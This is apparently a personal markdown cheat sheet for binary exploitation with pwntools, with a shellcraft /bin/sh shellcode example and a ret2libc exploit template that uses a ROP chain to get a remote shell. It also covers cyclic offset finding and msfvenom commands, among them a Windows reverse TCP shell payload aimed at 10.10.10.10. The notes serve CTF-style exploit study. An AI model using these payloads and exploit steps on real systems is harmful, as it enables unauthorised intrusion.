# pwntools

## Functions

 - shellcode = ELF("a.out").section(".text")
 - print(disasm(shellcode))
 - shellcraft 

```bash
$ pwn shellcraft -l 'amd64.linux' # List available shellcodes
$ pwn shellcraft amd64.linux.sh -r # run a shellcode
$ python3                         
>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) 
>>> print(syscall)
... asm ...
>>> bin = asm(syscall)
>>> ELF.from_bytes(bin).save("a.out")
```


## RET2LIBC Example

```python
from pwn import *
from hexdump import hexdump

#
# /!\ Specify the context
#
context.clear(arch = 'amd64')

s = remote(HOST, PORT) # work also with local process: process()
s.send(b'content')
data = s.recv(16)

rip = struct.unpack('<Q', data[0:8]) # Read unsigned long long, little endian
# Other formats: https://docs.python.org/3/library/struct.html#format-characters

libc = ELF('/path/to/libc')

# <Address in memory of libc> = <address of a function> - <address shift of the function in libc> 
# $ cat /proc/self/maps
base_libc = write_addr - libc.symbols['write']

# Set base address of libc, useful to get correct value
libc.address = base_libc

# Example of simple ROP
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
bin_sh = next(libc.search(b'/bin/sh\x00'))
rop.execve(bin_sh, 0, 0)

# Shorter version: shellcraft.amd64.dupsh(4), arch="amd64")
# https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.dupsh
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])


ROP_EXECVE = rop.chain()

s.send(ROP_EXECVE)

# Transform into interactive shell
s.interactive()
```

    
   
## Buffer Overflow

### cyclic strings to find overflow points

 - With pwntools:

```python
from pwn import *
g = cyclic_gen()
payload = g.get(10000)
# once crash, call find to have the min payload
g.find(b"abcd")
```

 - With msf: `msf-pattern_create -l 5000` then `msf-pattern_offset -q <int value from registry or string pattern>`

### Building shellcode

 - `msf-nasm_shell`
 - Windows payload to execute calc.exe and -b to specify any bad characters : `msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python' -b '\x00\x0A\x0D'`
 - `msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.10.10 LPORT=1234 -f 'python'`
 - [Online ASM/DISASM](https://defuse.ca/online-x86-assembler.htm)
 - Take care of invalid bytes that might stop the reading of the payload by the program
